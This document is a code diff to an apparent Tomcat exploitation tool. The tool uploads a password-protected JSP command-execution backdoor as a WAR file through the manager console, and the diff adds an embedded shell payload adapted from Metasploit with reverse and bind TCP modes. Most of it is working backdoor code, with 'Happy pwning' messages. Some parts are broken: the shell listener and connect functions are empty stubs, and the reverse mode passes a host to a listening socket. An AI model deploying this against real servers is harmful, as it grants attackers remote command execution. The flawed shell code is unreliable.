@@ -42,6 +42,14 @@ logging.addLevelName( logging.ERROR, "\033[1;41m%s\033[1;0m" % logging.getLevelN
 logger = logging.getLogger()
 
 
+def establishReverseTcpListener(opts):
+    pass
+
+def connectToBindShell(hostn, opts):
+    host = hostn[:hostn.find(':')]
+    
+
+
 def generateWAR(code, title, appname):
     dirpath = tempfile.mkdtemp()
 
@@ -106,9 +114,108 @@ Created-By: %s (Sun Microsystems Inc.)
 
     return (dirpath, outpath)
 
+def chooseShellFunctionality(opts):
+    host = opts.host
+    port = opts.port
+
+    if host and port:
+        # Reverse TCP
+        return 1
+    elif port and not host:
+        # Bind shell
+        return 2
+    else:
+        return 0
+
+
+def prepareTcpShellCode(opts):
+    host = opts.host
+    port = opts.port
+
+    socketArguments = ''
+    mode = chooseShellFunctionality(opts)
+    if mode == 1:
+        # Reverse TCP
+        socketArguments = '"%s", %s' % (host, port)
+        logging.debug('Preparing additional code for Reverse TCP shell')
+    elif mode == 2:
+        # Bind shell
+        socketArguments = '%s' % port
+        logging.debug('Preparing additional code for bind TCP shell')
+    else:
+        logging.debug('No additional code for shell functionality requested.')
+        return ''
+
+    #
+    # NOTICE:
+    #   The below code comes from the Rapid7 Metasploit-Framework, which in turn was based
+    #   on the code coming from: http://www.security.org.sg/code/jspreverse.html.
+    #   In order to refer to the original source, please look at the Metasploit core lib.
+    #   On Linux instances the file can be found at:
+    #       /usr/share/metasploit-framework/lib/msf/core/payload/jsp.rb
+    #
+    #
+    payload = ''' <%%
+  class StreamConnector extends Thread
+  {
+    InputStream ins;
+    OutputStream outs;
+
+    StreamConnector( InputStream ins, OutputStream outs )
+    {
+      this.ins = ins;
+      this.outs = outs;
+    }
+
+    public void run()
+    {
+      BufferedReader bufin  = null;
+      BufferedWriter bufout = null;
+      try
+      {
+        bufin  = new BufferedReader( new InputStreamReader( this.ins ) );
+        bufout = new BufferedWriter( new OutputStreamWriter( this.outs ) );
+        char buffer[] = new char[8192];
+        int length;
+        while( ( length = bufin.read( buffer, 0, buffer.length ) ) > 0 )
+        {
+          bufout.write( buffer, 0, length );
+          bufout.flush();
+        }
+      } catch( Exception e ){}
+      try
+      {
+        if( bufin != null )
+          bufin.close();
+        if( bufout != null )
+          bufout.close();
+      } catch( Exception e ){}
+    }
+  }
+
+  try
+  {
+    String ShellPath;
+    if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
+        ShellPath = new String("/bin/sh");
+    } else {
+        ShellPath = new String("cmd.exe");
+    }
+    ServerSocket server_socket = new ServerSocket(%(socketArguments)s);
+    Socket client_socket = server_socket.accept();
+    server_socket.close();
+    Process process = Runtime.getRuntime().exec( ShellPath );
+    ( new StreamConnector( process.getInputStream(), client_socket.getOutputStream() ) ).start();
+    ( new StreamConnector( client_socket.getInputStream(), process.getOutputStream() ) ).start();
+  } catch( Exception e ) {}
+%%>''' % {'socketArguments': socketArguments }
+
+    return payload
+
+
 def preparePayload(opts):
     logging.debug('Generating JSP WAR backdoor code...')
-    payload = '''<%%@ page import="java.util.*,java.io.*"%%> <%%!
+    payload = '''<%%@ page import="java.util.*,java.io.*,java.net.*,java.lang.*"%%> <%%!
     public String execute(String pass, String cmd) {
         final String hardcodedPass = "%(password)s";
         StringBuilder res = new StringBuilder();
@@ -139,6 +246,7 @@ def preparePayload(opts):
 <html>
     <head>
         <title>JSP Application</title>
+        %(shellPayload)s
     </head>
     <body>
         <h3>JSP Backdoor deployed as WAR on Apache Tomcat.</h3>
@@ -168,7 +276,7 @@ def preparePayload(opts):
             }
         %%></pre>
     </body>
-</html>''' % {'title': opts.title, 'password': opts.shellpass }
+</html>''' % {'title': opts.title, 'password': opts.shellpass, 'shellPayload': prepareTcpShellCode(opts) }
 
     return payload
 
@@ -291,8 +399,8 @@ Penetration Testing utility aiming at presenting danger of leaving Tomcat miscon
     parser.add_option_group(general)
 
     conn = optparse.OptionGroup(parser, 'Connection options')
-    conn.add_option('-H', '--host', metavar='RHOST', dest='host', default='0.0.0.0', help='Remote host for reverse tcp payload connection. When specified, RPORT must be specified too. Otherwise, bind tcp payload will be deployed, binded to 0.0.0.0 on target server.')
-    conn.add_option('-p', '--port', metavar='RPORT', dest='port', default='4444', help='Remote port for the reverse tcp payload. When specified, RHOST must be specified too. Otherwise, bind tcp payload will be deployed, listening on port 4444')
+    conn.add_option('-H', '--host', metavar='RHOST', dest='host', help='Remote host for reverse tcp payload connection. When specified, RPORT must be specified too. Otherwise, bind tcp payload will be deployed listening on 0.0.0.0')
+    conn.add_option('-p', '--port', metavar='PORT', dest='port', help='Remote port for the reverse tcp payload when used with RHOST or Local port if no RHOST specified thus acting as a Bind shell endpoint.')
     conn.add_option('-u', '--url', metavar='URL', dest='url', default='/manager/', help='Apache Tomcat management console URL. Default: /manager/')
 
     payload = optparse.OptionGroup(parser, 'Payload options')
@@ -304,10 +412,6 @@ Penetration Testing utility aiming at presenting danger of leaving Tomcat miscon
 
     opts, args = parser.parse_args()
 
-    if (opts.host and not opts.port) or (opts.port and not opts.host):
-        logger.error('Both RHOST and RPORT must be specified to deploy reverse tcp payload.')
-        sys.exit(0)
-
     if opts.port:
         try:
             port = int(opts.port)
@@ -316,6 +420,14 @@ Penetration Testing utility aiming at presenting danger of leaving Tomcat miscon
         except ValueError:
             logger.error('RPORT must be an integer in range 0-65535')
             sys.exit(0)
+
+    if (opts.host and not opts.port):
+        logger.error('Both RHOST and RPORT must be specified to deploy reverse tcp payload.')
+        sys.exit(0)
+    elif (opts.port and not opts.host):
+        logging.info('Bind shell will be deployed as a port has been specified and host not. Binded to: 0.0.0.0:%s' % opts.port)
+    elif (opts.host and opts.port):
+        logging.info('Reverse shell will be deployed on: %s:%s.' % (opts.host, opts.port))
 
     if opts.file and not os.path.exists(file):
         logger.error('Specified WAR file does not exists in local filesystem.')
@@ -338,8 +450,12 @@ def main():
         return
 
     try:
+        mode = chooseShellFunctionality(opts)
         if not opts.file:
             code = preparePayload(opts)
+            print '-'*50
+            print code
+            print '-'*50
             (dirpath, warpath) = generateWAR(code, opts.title, opts.appname)
         else:
             warpath = opts.file
@@ -362,9 +478,21 @@ def main():
 
         if deployApplication(browser, url, opts.appname, warpath):
             logging.debug('Succeeded, invoking it...')
+
+            if mode == 1:
+                logging.debug('Establishing listener for incoming reverse TCP shell')
+                establishReverseTcpListener(opts)
+
             if invokeApplication(browser, args[0], opts.appname):
                 logging.info("\033[0;32mJSP Backdoor up & running on http://%s/%s/\033[1;0m" % (args[0], opts.appname))
                 logging.info("\033[0;33mHappy pwning, here take that password: '%s'\033[1;0m" % opts.shellpass)
+
+                if mode == 2:
+                    logging.debug('Shell has binded to port %s at remote host. Connecting back to it...' % opts.port)
+                    connectToBindShell(args[0], opts)
+                
+                if mode == 0:
+                    logging.debug('No shell functionality was included in backdoor.')
             else:
                 logging.error("\033[1;41mNo pwning today, backdoor was not deployed.\033[1;0m")
         else:
